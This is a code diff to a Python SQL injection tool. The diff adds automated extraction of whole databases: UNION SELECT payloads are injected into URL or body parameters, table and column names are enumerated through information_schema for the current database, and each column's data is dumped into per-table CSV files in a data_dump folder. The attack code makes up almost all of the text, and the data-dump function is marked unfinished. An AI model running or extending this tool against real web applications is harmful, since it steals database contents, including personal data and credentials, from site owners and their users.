@@ -2,6 +2,9 @@ from ast import pattern
 import requests
 import argparse
 import re
+import csv
+import os
+
 
 
 # --------- PATTERNS --------- #
@@ -56,7 +59,7 @@ extraction_patterns = {
 	"mysql": {
 		"table_names": {
 			"key": "table_name",
-			"from": "FROM information_schema.tables--%20"
+			"from": "FROM information_schema.tables WHERE table_schema=DATABASE()--%20"
 		},
 		"column_names": {
 			"key": "column_name",
@@ -86,7 +89,15 @@ extraction_patterns = {
 
 
 
-# --------- PRINTS --------- #
+# --------- PRINTS AND WRITE --------- #
+def write_table_to_csv(directory, table_name, columns, rows):
+    filename = os.path.join(directory, f"{table_name}.csv")
+    with open(filename, "w", newline='', encoding="utf-8") as csvfile:
+        writer = csv.writer(csvfile)
+        writer.writerow(columns)
+        for row in rows:
+            writer.writerow(row)
+
 def print_record(record: dict, index: int | str, filter, base_content = None):
 	print(f" Record {index}:")
 	if record["infected_param"]:
@@ -102,6 +113,18 @@ def print_record(record: dict, index: int | str, filter, base_content = None):
 	else:
 		print(f"  - Response new content:\n{filter(record['response']['content'])} \033[0m\n")
 	print("\n")
+# ----------------------- #
+
+
+
+# --------- CONTENT TYPE CHECKS --------- #
+def is_body_json(headers: dict) -> bool:
+	content_type = headers.get("Content-Type", "")
+	return "application/json" in content_type
+
+def is_body_form_encoded(headers: dict) -> bool:
+	content_type = headers.get("Content-Type", "")
+	return "application/x-www-form-urlencoded" in content_type
 # ----------------------- #
 
 
@@ -335,8 +358,6 @@ def get_visible_index(injection_point: str, db_type: str, method, url, headers, 
 
 	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
 			body_string(original_body_params), injection_point, "extraction", union_select)
-
-	
 	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
 	
 	control_strings = get_control_strings([i for i in range(select_size)])
@@ -394,7 +415,6 @@ def extract_column_names(method, url, headers, body, injection_point: str, table
 		extraction_steps = extraction_patterns["sqlite"]["column_names"]
 
 	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"]).replace("$TABLE_NAME", table_name)
-	print(pattern_union)
 	if injection_point in original_query_params:
 		original_query_params[injection_point] += pattern_union
 	elif injection_point in original_body_params:
@@ -413,6 +433,29 @@ def extract_column_names(method, url, headers, body, injection_point: str, table
 
 	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
 
+def extract_data(method, url, headers, body, injection_point: str, table_name: str, db_type: str, default_request: dict, visible_index: int, select_size: int, column_name: str):
+	original_query_params = query_params(extract_query_string(url))
+	original_body_params = body_params(body)
+
+	if db_type.lower() == "mysql":
+		extraction_steps = extraction_patterns["mysql"]["data_dump"]
+	elif db_type.lower() == "sqlite":
+		extraction_steps = extraction_patterns["sqlite"]["data_dump"]
+
+	pattern_union = get_pattern_union(select_size, visible_index, extraction_steps["key"], extraction_steps["from"]).replace("$TABLE_NAME", table_name).replace("$COLUMN_NAME", column_name)
+	if injection_point in original_query_params:
+		original_query_params[injection_point] += pattern_union
+	elif injection_point in original_body_params:
+		original_body_params[injection_point] += pattern_union
+
+	record = request_record(method, assemble_full_url(extract_base_url(url), query_string(original_query_params)), headers,
+			body_string(original_body_params), injection_point, "extraction", pattern_union)
+	diff = only_new_content(default_request["response"]["content"], record["response"]["content"])
+
+	# To be continued...
+	# Here, check for SQL errors
+
+	return [strip_html_tags(line).strip() for line in diff.splitlines() if strip_html_tags(line).strip()]
 # ----------------------- #
 
 
@@ -420,6 +463,13 @@ def extract_column_names(method, url, headers, body, injection_point: str, table
 # --------- MAIN --------- #
 def main():
 	method, url, headers, body = parse_args()
+	if (method == "POST" and body and not (is_body_form_encoded(headers) or is_body_json(headers))):
+		print("[-] Unsupported Content-Type for body. Only 'application/x-www-form-urlencoded' and 'application/json' are supported.")
+		return
+
+	data_dump_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_dump")
+	if not os.path.exists(data_dump_dir):
+		os.makedirs(data_dump_dir)
 
 	try:
 		records = {
@@ -435,6 +485,7 @@ def main():
 		print("Injection Points:", injection_points if injection_points else "None")
 		print("Database Type:", db_type)
 
+		# Create a dir named data_dump if it doesn't exist
 		for injection_point in injection_points:
 			print(f"[!] Starting extraction for parameter '{injection_point}'...\n")
 			
@@ -458,6 +509,15 @@ def main():
 			for table in table_names:
 				columns_names = extract_column_names(method, url, headers, body, injection_point, table, db_type, records["default"], visible_index, num_columns)
 				print(f"[+] Extracted Column Names for table '{table}':\n{', '.join(columns_names)}\n")
+
+				datas = []
+				for column in columns_names:
+					data = extract_data(method, url, headers, body, injection_point, table, db_type, records["default"], visible_index, num_columns, column)
+					print(f"[+] Extracted Data for column '{column}' in table '{table}':\n{data}\n")
+					datas.append(data)
+
+				rows = list(zip(*datas)) if datas else []
+				write_table_to_csv("data_dump", table, columns_names, rows)
 
 	except requests.RequestException as e:
 		print("[!] An error occurred while making the requests:", e)
